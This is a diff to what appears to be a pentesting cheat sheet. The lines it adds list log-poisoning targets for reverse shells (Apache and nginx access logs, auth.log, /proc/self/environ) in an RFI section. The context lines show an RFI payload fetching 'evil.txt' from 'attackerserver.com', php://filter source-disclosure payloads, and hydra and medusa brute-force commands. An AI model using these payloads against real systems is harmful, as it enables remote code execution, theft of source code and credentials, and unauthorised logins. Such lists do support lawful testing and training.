@@ -51,6 +51,10 @@ php://filter/convert.base64-encode/resource=index.php
 ----------------------------------------------
 
 # RFI
+/var/log/apache2/access.log - user - agent reverse shell
+/var/log/nginx/access.log - user-agent reverse shell
+/var/log/auth.log - ssh reverse shell
+/proc/self/environ
 ?page=http://attackerserver.com/evil.txt
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
@@ -184,7 +188,7 @@ hydra -l user -P passlist.txt ftp://192.168.0.1
 *Medusa
 medusa -h <targetip> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/test -T 10
 
---------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 #FileTransfer Linux
 
 Python SimpleHTTPServer
